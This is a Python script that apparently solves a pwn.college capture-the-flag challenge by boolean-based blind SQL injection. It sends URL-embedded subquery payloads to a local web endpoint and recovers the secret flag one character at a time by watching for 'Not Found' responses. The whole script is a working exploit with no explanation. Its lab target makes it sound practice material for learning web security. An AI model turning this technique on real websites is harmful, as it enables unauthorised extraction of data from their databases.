#!/usr/bin/env python3

import requests
from urllib.parse import quote

url = 'http://localhost/post/'

flag = 'pwn.college{'
count = 12
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_}'

while flag[-1] != '}':
    for char in characters:
        payload = f'2 and (select substr(flag, 1, {count}) from flag)="{flag}{char}"--'
        print(payload)

        resp = requests.get(url+payload)
        if 'Not Found' in resp.text:
            continue
        else:
            flag += char
            count += 1
            print(f'[+] Flag so far: {flag}')
            break

print(flag)
